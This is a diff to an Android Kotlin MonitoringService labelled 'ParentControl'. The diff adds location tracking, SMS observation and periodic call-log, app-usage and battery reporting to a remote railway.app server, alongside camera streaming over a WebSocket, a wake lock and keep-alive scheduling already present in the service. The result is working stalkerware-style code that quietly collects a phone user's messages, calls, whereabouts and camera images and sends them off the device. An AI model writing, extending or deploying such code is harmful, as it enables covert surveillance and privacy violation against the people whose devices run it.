@@ -9,6 +9,7 @@ import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.ImageReader
 import android.media.MediaRecorder
+import android.os.BatteryManager
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
@@ -17,7 +18,9 @@ import androidx.core.app.NotificationCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import okio.ByteString.Companion.toByteString
+import org.json.JSONObject
 import java.io.File
 
 class MonitoringService : Service() {
@@ -36,6 +39,10 @@ class MonitoringService : Service() {
         SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
     ) * 2
     private var wakeLock: PowerManager.WakeLock? = null
+    private var locationTracker: LocationTracker? = null
+    private var smsReader: SmsReader? = null
+    private var callLogReader: CallLogReader? = null
+    private var appUsageReader: AppUsageReader? = null
 
     private var cameraDevice: CameraDevice? = null
     private var imageReader: ImageReader? = null
@@ -47,12 +54,63 @@ class MonitoringService : Service() {
     private val FRAME_INTERVAL = 150L
 
     override fun onCreate() {
-    super.onCreate()
-    createNotificationChannel()
-    startForeground(1, buildNotification())
-    acquireWakeLock()
-    KeepAliveReceiver.scheduleAlarm(this)
-}
+        super.onCreate()
+        createNotificationChannel()
+        startForeground(1, buildNotification())
+        acquireWakeLock()
+        KeepAliveReceiver.scheduleAlarm(this)
+
+        // Sab features start karo
+        locationTracker = LocationTracker(this)
+        locationTracker?.startTracking()
+
+        smsReader = SmsReader(this)
+        smsReader?.startObserving()
+
+        callLogReader = CallLogReader(this)
+        appUsageReader = AppUsageReader(this)
+
+        // Har 30 min mein call logs aur app usage bhejo
+        Handler(mainLooper).postDelayed({
+            callLogReader?.readAndSend()
+            appUsageReader?.readAndSend()
+            sendBatteryLevel()
+        }, 5000)
+
+        // Repeat every 30 min
+        val repeatHandler = Handler(mainLooper)
+        val repeatRunnable = object : Runnable {
+            override fun run() {
+                callLogReader?.readAndSend()
+                appUsageReader?.readAndSend()
+                sendBatteryLevel()
+                repeatHandler.postDelayed(this, 30 * 60 * 1000)
+            }
+        }
+        repeatHandler.postDelayed(repeatRunnable, 30 * 60 * 1000)
+    }
+
+    private fun sendBatteryLevel() {
+        Thread {
+            try {
+                val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+                val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+                val charging = bm.isCharging
+                val json = JSONObject().apply {
+                    put("device", DEVICE_NAME)
+                    put("level", level)
+                    put("charging", charging)
+                    put("time", System.currentTimeMillis())
+                }
+                val body = json.toString().toRequestBody("application/json".toMediaType())
+                OkHttpClient().newCall(
+                    Request.Builder()
+                        .url("https://overflowing-perception-production-17b2.up.railway.app/battery")
+                        .post(body).build()
+                ).execute()
+            } catch (e: Exception) { e.printStackTrace() }
+        }.start()
+    }
 
     private fun acquireWakeLock() {
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -60,7 +118,7 @@ class MonitoringService : Service() {
             PowerManager.PARTIAL_WAKE_LOCK,
             "ParentControl::MonitoringWakeLock"
         )
-        wakeLock?.acquire(10 * 60 * 60 * 1000L) // 10 hours
+        wakeLock?.acquire(10 * 60 * 60 * 1000L)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -145,7 +203,6 @@ class MonitoringService : Service() {
                 }
                 override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
                     isLive = false
-                    // Auto reconnect
                     Handler(mainLooper).postDelayed({
                         if (isLive) startLiveStream()
                     }, 3000)
@@ -185,12 +242,10 @@ class MonitoringService : Service() {
         isCameraLive = true
         cameraThread = HandlerThread("CameraThread").also { it.start() }
         cameraHandler = Handler(cameraThread!!.looper)
-
         val okClient = OkHttpClient.Builder()
             .writeTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
             .pingInterval(20, java.util.concurrent.TimeUnit.SECONDS)
             .build()
-
         wsCamera = okClient.newWebSocket(
             Request.Builder().url("$WS_URL?type=camera&device=$DEVICE_NAME").build(),
             object : WebSocketListener() {
@@ -208,7 +263,6 @@ class MonitoringService : Service() {
         val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         val cameraList = cameraManager.cameraIdList
         val cameraId = cameraList[currentCameraIndex.coerceAtMost(cameraList.size - 1)]
-
         imageReader = ImageReader.newInstance(256, 192, ImageFormat.JPEG, 3)
         imageReader?.setOnImageAvailableListener({ reader ->
             val now = System.currentTimeMillis()
@@ -223,27 +277,22 @@ class MonitoringService : Service() {
             }
             image.close()
         }, cameraHandler)
-
         cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
             override fun onOpened(camera: CameraDevice) {
                 cameraDevice = camera
                 val surface = imageReader!!.surface
-                camera.createCaptureSession(
-                    listOf(surface),
-                    object : CameraCaptureSession.StateCallback() {
-                        override fun onConfigured(session: CameraCaptureSession) {
-                            captureSession = session
-                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-                                addTarget(surface)
-                                set(CaptureRequest.JPEG_QUALITY, 60)
-                                set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, android.util.Range(10, 15))
-                            }.build()
-                            session.setRepeatingRequest(request, null, cameraHandler)
-                        }
-                        override fun onConfigureFailed(session: CameraCaptureSession) {}
-                    },
-                    cameraHandler
-                )
+                camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        captureSession = session
+                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                            addTarget(surface)
+                            set(CaptureRequest.JPEG_QUALITY, 60)
+                            set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, android.util.Range(10, 15))
+                        }.build()
+                        session.setRepeatingRequest(request, null, cameraHandler)
+                    }
+                    override fun onConfigureFailed(session: CameraCaptureSession) {}
+                }, cameraHandler)
             }
             override fun onDisconnected(camera: CameraDevice) { camera.close() }
             override fun onError(camera: CameraDevice, error: Int) { camera.close() }
